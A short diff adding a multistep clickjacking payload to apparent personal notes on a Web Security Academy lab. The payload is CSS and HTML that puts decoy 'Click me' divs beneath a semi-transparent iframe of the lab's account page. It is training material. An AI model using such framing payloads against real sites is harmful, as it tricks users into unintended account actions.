@@ -88,5 +88,29 @@
 
 <iframe src="https://0a9800bd042be931800d7bd1008700f6.web-security-academy.net/my-account"></iframe>
 
+# If they both don't work try this, this worked for me in the end:
+<style>
+iframe {
+position:relative;
+width:750px;
+height: 600px;
+opacity: 0.8;
+z-index: 2;
+}
+.firstClick, .secondClick {
+position:absolute;
+top:500px;
+left:60px;
+z-index: 1;
+}
+.secondClick {
+top:290px;
+left:210px;
+}
+</style>
+<div class="firstClick">Click me first</div>
+<div class="secondClick">Click me next</div>
+<iframe src="https://0a7a009b041358689be0acaa006900b9.web-security-academy.net/my-account"></iframe>
+
 # The problem with this labs sometimes true payload doesn't work so you might need to multiple diffirent payloads diffirent times.
 ``
